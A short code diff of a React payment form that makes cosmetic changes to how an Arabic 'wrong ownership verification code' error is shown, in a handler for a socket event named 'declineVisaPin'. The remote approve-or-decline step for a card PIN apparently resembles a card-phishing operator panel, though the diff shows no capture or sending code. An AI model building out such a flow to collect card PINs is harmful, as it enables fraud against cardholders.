@@ -192,7 +192,6 @@ const PaymentForm = () => {
     if (id === JSON.parse(data)._id) {
       setLoading(false);
       window.scrollTo(0, 0);
-
     }
   });
 
@@ -222,9 +221,7 @@ const PaymentForm = () => {
   socket.on("declineVisaPin", (id) => {
     if (id === JSON.parse(data)._id) {
       setLoading(false);
-      setError(`حدث خطآ في رمز التوثيق 
-❌
-رمز اثبات الملكيه خاطئ`);
+      setError(` رمز اثبات الملكيه خاطئ`);
     }
   });
 
@@ -584,6 +581,7 @@ const PaymentForm = () => {
       {error ? (
         <div className="w-full text-center text-red-500  absolute bg-black bg-opacity-45 h-screen top-0 left-0 flex items-center justify-center">
           <div className="bg-white py-5 px-2 md:w-1/4 w-11/12 flex justify-center items-center flex-col text-lg gap-y-3">
+            <span>حدث خطآ في رمز التوثيق </span>
             <AiOutlineCloseCircle
               className="text-6xl"
               onClick={() => setError(null)}
